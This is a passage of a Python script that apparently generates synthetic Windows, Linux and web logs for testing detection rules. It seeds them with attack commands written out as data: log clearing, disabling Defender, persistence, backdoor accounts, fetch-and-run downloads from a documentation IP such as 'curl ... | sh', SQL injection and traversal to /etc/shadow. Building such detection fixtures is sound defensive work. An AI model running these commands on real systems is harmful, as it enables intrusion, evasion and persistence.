               (510, "C:\\Windows\\System32\\wevtutil.exe", "wevtutil.exe cl Security", "C:\\Windows\\System32\\cmd.exe"),
               (520, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell Set-MpPreference -DisableRealtimeMonitoring $true", "C:\\Windows\\System32\\cmd.exe"),
               (600, "C:\\Windows\\System32\\schtasks.exe", "schtasks /create /tn Atualiza /tr C:\\Users\\Public\\p.exe /sc minute", "C:\\Windows\\System32\\cmd.exe"),
               (610, "C:\\Windows\\System32\\sc.exe", "sc.exe create Atualizador binPath= C:\\Users\\Public\\p.exe start= auto", "C:\\Windows\\System32\\cmd.exe"),
               (620, "C:\\Windows\\System32\\reg.exe", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d C:\\Users\\Public\\p.exe", "C:\\Windows\\System32\\cmd.exe"),
               (700, "C:\\Windows\\System32\\net1.exe", "net1 user suporte$ Senha123 /add", "C:\\Windows\\System32\\cmd.exe"),
               (710, "C:\\Windows\\System32\\net.exe", "net group \"Domain Admins\" /domain", "C:\\Windows\\System32\\cmd.exe"),
               (720, "C:\\Windows\\System32\\whoami.exe", "whoami /priv", "C:\\Windows\\System32\\cmd.exe"),
               (730, "C:\\Windows\\System32\\wbem\\WMIC.exe", "wmic /node:SRV-APP-01 process call create \"cmd /c calc\"", "C:\\Windows\\System32\\cmd.exe"),
               (800, "C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin /transfer j http://203.0.113.5/a.exe C:\\Users\\Public\\a.exe", "C:\\Windows\\System32\\cmd.exe"),
               (810, "C:\\Windows\\System32\\regsvr32.exe", "regsvr32 /s /n /u /i:http://203.0.113.5/x.sct scrobj.dll", "C:\\Windows\\System32\\cmd.exe"),
               (900, "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami", "C:\\Windows\\System32\\inetsrv\\w3wp.exe")]
    for sec, img, cmd, parent in attacks:
        sysmon.append({"timestamp": iso(sec), "EventID": 1, "Computer": "PC-FIN-01" if sec < 800 else "SRV-APP-01", "User": "ana" if sec < 800 else "iis_app", "Image": img, "CommandLine": cmd, "ParentImage": parent})
    write_jsonl("windows_sysmon.jsonl", sysmon)

    sec_events = []
    for i in range(40):
        sec_events.append({"timestamp": iso(rnd.uniform(0, 3500)), "EventID": 4624, "Computer": "DC-01", "TargetUserName": rnd.choice(users), "IpAddress": f"10.0.4.{rnd.randint(10, 40)}", "LogonType": 3})
    for i in range(3):
        sec_events.append({"timestamp": iso(1000 + i * 40), "EventID": 4625, "Computer": "DC-01", "TargetUserName": "carla", "IpAddress": "10.0.4.22", "LogonType": 3})
    for i in range(26):
        sec_events.append({"timestamp": iso(1800 + i * 4), "EventID": 4625, "Computer": "DC-01", "TargetUserName": "administrator", "IpAddress": "203.0.113.50", "LogonType": 3})
    spray_users = ["ana", "bruno", "carla", "diego", "elisa", "fabio", "gina", "hugo", "iris", "jonas", "karen", "luis"]
    for i, u in enumerate(spray_users):
        sec_events.append({"timestamp": iso(2400 + i * 25), "EventID": 4625, "Computer": "DC-01", "TargetUserName": u, "IpAddress": "198.51.100.77", "LogonType": 3})
    write_jsonl("windows_security.jsonl", sec_events)

    auth = []
    for i in range(30):
        auth.append({"timestamp": iso(rnd.uniform(0, 3500)), "host": "srv-linux-01", "program": "sshd", "message": f"Accepted publickey for {rnd.choice(users)} from 10.0.4.{rnd.randint(10, 40)} port {rnd.randint(30000, 60000)} ssh2", "src_ip": f"10.0.4.{rnd.randint(10, 40)}"})
    for i in range(2):
        auth.append({"timestamp": iso(1500 + i * 50), "host": "srv-linux-01", "program": "sshd", "message": "Failed password for ana from 10.0.4.15 port 41000 ssh2", "src_ip": "10.0.4.15"})
    for i in range(14):
        auth.append({"timestamp": iso(2000 + i * 6), "host": "srv-linux-01", "program": "sshd", "message": f"Failed password for root from 192.0.2.99 port {40000 + i} ssh2", "src_ip": "192.0.2.99"})
    for i, (img, cmd) in enumerate([("/usr/sbin/useradd", "useradd -m suporte"), ("/usr/bin/bash", "curl -s http://203.0.113.5/i.sh | sh"), ("/usr/bin/bash", "ls -la /home")]):
        auth.append({"timestamp": iso(2600 + i * 30), "host": "srv-linux-01", "Image": img, "CommandLine": cmd, "User": "root"})
    auth.append({"timestamp": iso(2700), "host": "srv-linux-01", "Image": "/usr/bin/vim", "TargetFilename": "/etc/cron.d/atualiza", "User": "root"})
    auth.append({"timestamp": iso(2710), "host": "srv-linux-01", "Image": "/usr/bin/dpkg", "TargetFilename": "/etc/cron.d/logrotate", "User": "root"})
    write_jsonl("linux_logs.jsonl", auth)

    web = []
    pages = ["/", "/produtos", "/contato", "/login", "/imagens/logo.png", "/api/status"]
    for i in range(120):
        web.append({"timestamp": iso(rnd.uniform(0, 3500)), "c-ip": f"10.0.0.{rnd.randint(2, 60)}", "cs-method": "GET", "cs-uri-stem": rnd.choice(pages), "cs-uri-query": rnd.choice(["", "q=cafe", "page=2", "id=15"]),
                    "cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "sc-status": 200})
    for i, (stem, query, ua) in enumerate([("/produtos", "id=1 UNION SELECT user,pass FROM users", "Mozilla/5.0"), ("/login", "u=a%27%20or%201=1--", "Mozilla/5.0"),
                                           ("/produtos", "id=15&x=1", "sqlmap/1.7#stable (https://sqlmap.org)"), ("/download/../../etc/passwd", "", "curl/8.4.0"),
                                           ("/img/%2e%2e%2f%2e%2e%2fetc/shadow", "", "curl/8.4.0")]):
        web.append({"timestamp": iso(3000 + i * 15), "c-ip": "203.0.113.9", "cs-method": "GET", "cs-uri-stem": stem, "cs-uri-query": query, "cs-user-agent": ua, "sc-status": 404})
    write_jsonl("web_access.jsonl", web)


if __name__ == "__main__":
    n = write_rules()
    write_logs()
    print(f"{n} regras em rules/ e 4 arquivos de log em samples/", file=sys.stderr)
